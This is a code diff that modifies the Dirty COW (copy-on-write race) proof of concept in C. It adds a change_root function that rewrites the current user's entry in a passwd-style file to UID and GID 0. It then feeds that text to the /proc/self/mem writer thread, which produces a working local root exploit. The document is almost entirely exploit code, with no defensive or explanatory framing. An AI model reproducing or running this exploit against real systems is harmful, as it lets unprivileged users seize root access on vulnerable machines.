@@ -21,6 +21,8 @@ m00000000000000000
 #include <fcntl.h>
 #include <pthread.h>
 #include <string.h>
+#include <errno.h>
+#include <pwd.h>
 #define ESC          "\033"
 #define LOOP 100000000
  
@@ -28,7 +30,8 @@ void *map;
 int f;
 struct stat st;
 char *name;
- 
+char writen[102400];
+
 void *madviseThread(void *arg)
 {
   char *str;
@@ -72,17 +75,51 @@ You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?
   }
 }
  
+void
+change_root(char *name)
+{
+  FILE            *fp;
+  char            *curr_name;
+  char            buf[1024];
+  char            tmpbuf[100] = {'\0'};
+  struct passwd  *pwd;
+  char           *tab1, *tab2, *tab3, *tab4;
+
+  fp=fopen(name, "r");
+  pwd = getpwuid(getuid());
+  curr_name = pwd->pw_name;
+  while (fgets(buf, 1024, fp)) {
+      tab1 = strchr(buf, ':'); 
+      strncpy(tmpbuf, buf, tab1 - buf);
+      if (!strcmp(tmpbuf, curr_name)) {
+          char mod_buf[1024] = {'\0'};
+          strcat(mod_buf, curr_name);
+          tab2 = strchr(tab1 + 1, ':');
+          tab3 = strchr(tab2 + 1, ':');
+          tab4 = strchr(tab3 + 1, ':');
+          strcat(mod_buf, ":x:0:0");
+          strcat(mod_buf, tab4);
+
+          strcat(writen, mod_buf);
+      } else {
+          strcat(writen, buf);
+      }
+      memset(tmpbuf, '\0', 100);
+  }
+}
+
  
 int main(int argc,char *argv[])
 {
 /*
 You have to pass two arguments. File and Contents.
 */
-  if (argc<3)return 1;
+  if (argc<2)return 1;
   pthread_t pth1,pth2;
 /*
 You have to open the file in read only mode.
 */
+  
   f=open(argv[1],O_RDONLY);
   fstat(f,&st);
   name=argv[1];
@@ -97,13 +134,14 @@ You have to use MAP_PRIVATE for copy-on-write mapping.
 /*
 You have to open with PROT_READ.
 */
+  change_root(name);
   map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
   printf("mmap %x\n\n",map);
 /*
 You have to do it on two threads.
 */
   pthread_create(&pth1,NULL,madviseThread,argv[1]);
-  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+  pthread_create(&pth2,NULL,procselfmemThread,writen);
 /*
 You have to wait for the threads to finish.
 */
